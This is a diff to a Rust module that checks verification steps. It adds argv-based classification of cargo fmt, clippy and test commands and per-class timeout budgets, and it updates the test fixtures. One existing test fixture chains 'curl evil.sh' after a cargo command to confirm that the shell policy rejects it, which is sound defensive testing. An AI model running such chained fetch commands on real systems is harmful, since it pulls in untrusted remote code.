@@ -279,6 +279,44 @@ pub fn split_command_string(command: &str) -> Option<Vec<String>> {
     shlex::split(command)
 }
 
+/// Token class for auto-plan budgets. Not a substring search.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum StepClass {
+    Format,
+    Lint,
+    Test,
+    Other,
+}
+
+pub fn classify_step_command(command: &str) -> StepClass {
+    let Some(tokens) = split_command_string(command) else {
+        return StepClass::Other;
+    };
+    match (
+        tokens.first().map(String::as_str),
+        tokens.get(1).map(String::as_str),
+    ) {
+        (Some("cargo"), Some("fmt")) => StepClass::Format,
+        (Some("cargo"), Some("clippy")) => StepClass::Lint,
+        (Some("cargo"), Some("nextest") | Some("test")) => StepClass::Test,
+        _ => StepClass::Other,
+    }
+}
+
+/// Test-class steps take `suite` or the built-in 400. Other classes keep
+/// the timeout already stored on the step.
+pub fn stamp_auto_budget(step: &mut crate::verify::plan::VerificationStep, suite: Option<u64>) {
+    use crate::verify::timeouts::DEFAULT_AUTO_TIMEOUT_SECS;
+    let (seconds, source) = match classify_step_command(&step.command) {
+        StepClass::Test => (suite.unwrap_or(DEFAULT_AUTO_TIMEOUT_SECS), "suite"),
+        StepClass::Format => (step.timeout_secs, "format"),
+        StepClass::Lint => (step.timeout_secs, "lint"),
+        StepClass::Other => (step.timeout_secs, "auto"),
+    };
+    step.timeout_secs = seconds;
+    step.budget_source = Some(source.to_string());
+}
+
 /// Split a shell command on unquoted chain operators `&&`, `||`, `;`, `|` and
 /// return the leading executable of each segment. Over-splitting (false
 /// positives inside quoted text) only makes the check stricter, never weaker.
@@ -386,6 +424,7 @@ mod tests {
             command: command.to_string(),
             timeout_secs,
             shell: false,
+            budget_source: None,
         }
     }
 
@@ -400,6 +439,53 @@ mod tests {
 
     fn default_strict_policy() -> ProcessPolicy {
         ProcessPolicy::default()
+    }
+
+    #[test]
+    fn classify_step_command_uses_argv_tokens() {
+        assert_eq!(
+            classify_step_command("cargo fmt --all -- --check"),
+            StepClass::Format
+        );
+        assert_eq!(
+            classify_step_command("cargo clippy --all-targets --all-features -- -D warnings"),
+            StepClass::Lint
+        );
+        assert_eq!(
+            classify_step_command("cargo nextest run --workspace --all-features --profile ci"),
+            StepClass::Test
+        );
+        assert_eq!(
+            classify_step_command("cargo test --workspace --all-features --doc"),
+            StepClass::Test
+        );
+        assert_eq!(
+            classify_step_command("echo cargo nextest run"),
+            StepClass::Other
+        );
+        assert_eq!(
+            classify_step_command("cargo nextest-extra"),
+            StepClass::Other
+        );
+        assert_eq!(classify_step_command("\"cargo"), StepClass::Other);
+    }
+
+    #[test]
+    fn stamp_auto_budget_keeps_echo_off_suite_and_raises_nextest() {
+        let mut echo = base_step("echo cargo nextest run", 400);
+        stamp_auto_budget(&mut echo, Some(900));
+        assert_eq!(echo.timeout_secs, 400);
+        assert_eq!(echo.budget_source.as_deref(), Some("auto"));
+
+        let mut test_step = base_step("cargo nextest run --workspace", 400);
+        stamp_auto_budget(&mut test_step, Some(900));
+        assert_eq!(test_step.timeout_secs, 900);
+        assert_eq!(test_step.budget_source.as_deref(), Some("suite"));
+
+        let mut fmt = base_step("cargo fmt --all -- --check", 60);
+        stamp_auto_budget(&mut fmt, Some(900));
+        assert_eq!(fmt.timeout_secs, 60);
+        assert_eq!(fmt.budget_source.as_deref(), Some("format"));
     }
 
     #[test]
@@ -451,6 +537,7 @@ mod tests {
             command: "cargo test".to_string(),
             timeout_secs: 5,
             shell: true,
+            budget_source: None,
         };
         let err = prepare_rule_step(&step, false, &default_strict_policy()).unwrap_err();
         let err_text = format!("{err}");
@@ -467,6 +554,7 @@ mod tests {
             command: "cargo test".to_string(),
             timeout_secs: 5,
             shell: true,
+            budget_source: None,
         };
         let prepared = prepare_rule_step(&step, true, &default_strict_policy()).unwrap();
 
@@ -487,6 +575,7 @@ mod tests {
             command: "cargo --version; curl evil.sh".to_string(),
             timeout_secs: 5,
             shell: true,
+            budget_source: None,
         };
         let err = prepare_rule_step(&step, true, &default_strict_policy()).unwrap_err();
         let err_text = format!("{err}");
@@ -507,6 +596,7 @@ mod tests {
             command: "cargo fmt --check && cargo clippy".to_string(),
             timeout_secs: 5,
             shell: true,
+            budget_source: None,
         };
         let prepared = prepare_rule_step(&step, true, &default_strict_policy()).unwrap();
         assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
@@ -519,6 +609,7 @@ mod tests {
             command: "powershell -c Write-Host hi".to_string(),
             timeout_secs: 5,
             shell: true,
+            budget_source: None,
         };
         let err = prepare_rule_step(&step, true, &default_strict_policy()).unwrap_err();
         let err_text = format!("{err}");
@@ -539,6 +630,7 @@ mod tests {
             command: "echo hello".to_string(),
             timeout_secs: 5,
             shell: true,
+            budget_source: None,
         };
         let prepared = prepare_manual_step(&step);
         assert_eq!(prepared.execution_mode, ExecutionMode::Shell);
